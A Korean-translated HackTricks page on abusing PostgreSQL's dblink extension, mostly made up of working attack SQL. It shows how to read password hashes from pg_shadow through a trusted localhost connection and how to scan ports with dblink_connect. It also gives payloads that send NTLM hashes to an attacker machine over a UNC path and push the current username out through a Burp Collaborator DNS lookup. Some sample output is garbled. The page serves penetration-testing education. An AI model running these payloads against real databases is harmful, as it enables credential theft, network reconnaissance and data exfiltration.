{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


**ì´ ê³µê²©ì— ëŒ€í•œ [ìì„¸í•œ ì •ë³´ëŠ” ì›ë³¸ ë¬¸ì„œì—ì„œ í™•ì¸í•˜ì„¸ìš”](http://www.leidecker.info/pgshell/Having\_Fun\_With\_PostgreSQL.txt)**.

**PostgreSQL 9.1**ë¶€í„° ì¶”ê°€ ëª¨ë“ˆ ì„¤ì¹˜ê°€ ê°„ë‹¨í•©ë‹ˆë‹¤. [ë“±ë¡ëœ í™•ì¥ í”„ë¡œê·¸ë¨ì¸ `dblink`](https://www.postgresql.org/docs/current/contrib.html)ëŠ” [`CREATE EXTENSION`](https://www.postgresql.org/docs/current/sql-createextension.html)ìœ¼ë¡œ ì„¤ì¹˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```sql
CREATE EXTENSION dblink;
```
Once you have dblink loaded you could be able to perform some interesting tricks:

## Privilege Escalation

íŒŒì¼ `pg_hba.conf`ê°€ ì˜ëª» êµ¬ì„±ë˜ì–´ **ë¹„ë°€ë²ˆí˜¸ë¥¼ ì•Œ í•„ìš” ì—†ì´** **ëª¨ë“  ì‚¬ìš©ìë¡œë¶€í„° localhostì˜ ì—°ê²°ì„ í—ˆìš©**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ íŒŒì¼ì€ ì¼ë°˜ì ìœ¼ë¡œ `/etc/postgresql/12/main/pg_hba.conf`ì— ìœ„ì¹˜í•˜ë©°, ì˜ëª»ëœ êµ¬ì„±ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:
```
local    all    all    trust
```
_ì´ êµ¬ì„±ì€ ê´€ë¦¬ìê°€ ë¹„ë°€ë²ˆí˜¸ë¥¼ ìŠì–´ë²„ë ¸ì„ ë•Œ db ì‚¬ìš©ìì˜ ë¹„ë°€ë²ˆí˜¸ë¥¼ ìˆ˜ì •í•˜ëŠ” ë° ì¼ë°˜ì ìœ¼ë¡œ ì‚¬ìš©ë˜ë¯€ë¡œ, ë•Œë•Œë¡œ ì´ë¥¼ ë°œê²¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤._\
_ë˜í•œ pg\_hba.conf íŒŒì¼ì€ postgres ì‚¬ìš©ì ë° ê·¸ë£¹ë§Œ ì½ì„ ìˆ˜ ìˆìœ¼ë©°, postgres ì‚¬ìš©ìë§Œ ì“¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤._

ì´ ê²½ìš°ëŠ” **ìœ ìš©í•©ë‹ˆë‹¤** **ë§Œì•½** ë‹¹ì‹ ì´ **ì´ë¯¸** í”¼í•´ì ì•ˆì— **ì‰˜**ì„ ê°€ì§€ê³  ìˆë‹¤ë©´, ì´ëŠ” ë‹¹ì‹ ì´ postgresql ë°ì´í„°ë² ì´ìŠ¤ì— ì—°ê²°í•  ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤.

ë˜ ë‹¤ë¥¸ ê°€ëŠ¥í•œ ì˜ëª»ëœ êµ¬ì„±ì€ ë‹¤ìŒê³¼ ê°™ì€ ê²ƒì…ë‹ˆë‹¤:
```
host    all     all     127.0.0.1/32    trust
```
ë¡œì»¬í˜¸ìŠ¤íŠ¸ì˜ ëª¨ë“  ì‚¬ìš©ìê°€ ë°ì´í„°ë² ì´ìŠ¤ì— ì—°ê²°í•  ìˆ˜ ìˆê²Œ ë©ë‹ˆë‹¤.\
ì´ ê²½ìš° **`dblink`** í•¨ìˆ˜ê°€ **ì‘ë™**í•˜ë©´, ì´ë¯¸ ì„¤ì •ëœ ì—°ê²°ì„ í†µí•´ ë°ì´í„°ë² ì´ìŠ¤ì— ì—°ê²°í•˜ì—¬ ì ‘ê·¼í•  ìˆ˜ ì—†ëŠ” ë°ì´í„°ì— ì ‘ê·¼í•¨ìœ¼ë¡œì¨ **ê¶Œí•œ ìƒìŠ¹**ì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=postgres
dbname=postgres',
'SELECT datname FROM pg_database')
RETURNS (result TEXT);

SELECT * FROM dblink('host=127.0.0.1
user=postgres
dbname=postgres',
'select usename, passwd from pg_shadow')
RETURNS (result1 TEXT, result2 TEXT);
```
## Port Scanning

`dblink_connect`ë¥¼ ì•…ìš©í•˜ì—¬ **ì—´ë ¤ ìˆëŠ” í¬íŠ¸ë¥¼ ê²€ìƒ‰**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë§Œì•½ ê·¸ **ê¸°ëŠ¥ì´ ì‘ë™í•˜ì§€ ì•Šìœ¼ë©´ ë¬¸ì„œì— ë”°ë¥´ë©´ `dblink_connect_u()`ë¥¼ ì‚¬ìš©í•´ ë³´ì•„ì•¼ í•©ë‹ˆë‹¤. `dblink_connect_u()`ëŠ” `dblink_connect()`ì™€ ë™ì¼í•˜ì§€ë§Œ, ë¹„ìŠˆí¼ìœ ì €ê°€ ëª¨ë“  ì¸ì¦ ë°©ë²•ì„ ì‚¬ìš©í•˜ì—¬ ì—°ê²°í•  ìˆ˜ ìˆë„ë¡ í—ˆìš©í•©ë‹ˆë‹¤._
```sql
SELECT * FROM dblink_connect('host=216.58.212.238
port=443
user=name
password=secret
dbname=abc
connect_timeout=10');
//Different response
// Port closed
RROR:  could not establish connection
DETAIL:  could not connect to server: Connection refused
Is the server running on host "127.0.0.1" and accepting
TCP/IP connections on port 4444?

// Port Filtered/Timeout
ERROR:  could not establish connection
DETAIL:  timeout expired

// Accessing HTTP server
ERROR:  could not establish connection
DETAIL:  timeout expired

// Accessing HTTPS server
ERROR:  could not establish connection
DETAIL:  received invalid response to SSL negotiation:
```
**ì‚¬ìš©í•˜ê¸° ì „ì—** `dblink_connect` ë˜ëŠ” `dblink_connect_u`ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆë„ë¡ ë‹¤ìŒì„ ì‹¤í–‰í•´ì•¼ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
CREATE extension dblink;
```
## UNC ê²½ë¡œ - NTLM í•´ì‹œ ìœ ì¶œ
```sql
-- can be used to leak hashes to Responder/equivalent
CREATE TABLE test();
COPY test FROM E'\\\\attacker-machine\\footestbar.txt';
```

```sql
-- to extract the value of user and send it to Burp Collaborator
CREATE TABLE test(retval text);
CREATE OR REPLACE FUNCTION testfunc() RETURNS VOID AS $$
DECLARE sqlstring TEXT;
DECLARE userval TEXT;
BEGIN
SELECT INTO userval (SELECT user);
sqlstring := E'COPY test(retval) FROM E\'\\\\\\\\'||userval||E'.xxxx.burpcollaborator.net\\\\test.txt\'';
EXECUTE sqlstring;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;
SELECT testfunc();
```
{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
